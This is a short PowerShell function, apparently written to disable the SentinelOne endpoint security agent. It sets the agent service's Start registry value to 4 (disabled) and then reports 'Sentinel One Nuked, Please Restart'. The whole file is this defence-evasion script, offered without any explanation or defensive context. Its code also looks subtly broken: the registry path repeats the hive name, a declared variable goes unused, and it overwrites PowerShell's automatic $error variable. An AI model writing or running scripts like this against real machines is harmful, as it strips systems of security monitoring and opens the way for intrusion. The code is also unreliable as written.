function Nuke(){
  [cmdletbinding()]
  $sentinelOne = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SentinelAgent";
  $error = $false;
  Try{
    New-Itemproperty -Path HKLM:\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SentinelAgent -Name Start -Value 4 -PropertyType DWORD -force | out-null
  }
  catch{
    $error = $true;
  }
  finally{
    if($error){
      "An error occured nuking sentinel one"
    }
    else{ "Sentinel One Nuked, Please Restart"; }
  }
}


